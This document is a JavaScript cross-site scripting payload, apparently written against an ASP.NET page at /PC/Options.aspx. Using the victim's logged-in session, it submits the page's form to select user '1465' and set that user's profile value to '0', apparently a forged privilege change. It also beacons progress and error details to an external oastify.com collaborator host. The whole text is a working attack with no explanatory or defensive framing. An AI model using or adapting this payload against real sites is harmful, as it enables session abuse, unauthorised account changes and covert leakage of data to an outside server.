(async () => {
  const C = 'https://kaym8xz903sg0oepb9mbf1so9ff53u.oastify.com/';
  const beak = s => { try { new Image().src = C + s + '?t=' + Date.now(); } catch (e) {} };
  beak('fired');

  const U      = '/PC/Options.aspx?param=616a586f65422f51612f6c5266757647477639626e513d3d';
  const TARGET = '1465';
  const PERFIL = '0';

  const get  = u => fetch(u, {credentials:'include'}).then(r => r.text());
  const post = (u, fd) => fetch(u, {
    method:'POST', credentials:'include',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:new URLSearchParams(fd)
  }).then(r => r.text());
  const form = h => new DOMParser().parseFromString(h, 'text/html').getElementById('form1');

  try {
    const h1 = await get(U);
    let f = form(h1);
    beak('got-' + (f ? 'form' : 'NOFORM') + '-len' + h1.length);

    let fd = new FormData(f);
    fd.set('__EVENTTARGET', 'm_lstNom');
    fd.set('__EVENTARGUMENT', '');
    fd.set('m_lstNom', TARGET);
    const h2 = await post(U, fd);
    f = form(h2);
    const pSel = (h2.match(/m_lstPerfil[\s\S]*?selected[^>]*value="(\d)"/) || [])[1];
    beak('sel-' + (f ? 'form' : 'NOFORM') + '-perfil' + pSel + '-len' + h2.length);

    fd = new FormData(f);
    fd.set('__EVENTTARGET', '');
    fd.set('__EVENTARGUMENT', '');
    fd.set('m_lstNom', TARGET);
    fd.set('m_lstPerfil', PERFIL);
    fd.set('m_btnGuardar', 'Guardar');
    const h3 = await post(U, fd);
    beak('saved-len' + h3.length);
  } catch (e) {
    beak('err-' + encodeURIComponent(((e && e.message) || e) + '').slice(0, 80));
  }
})();
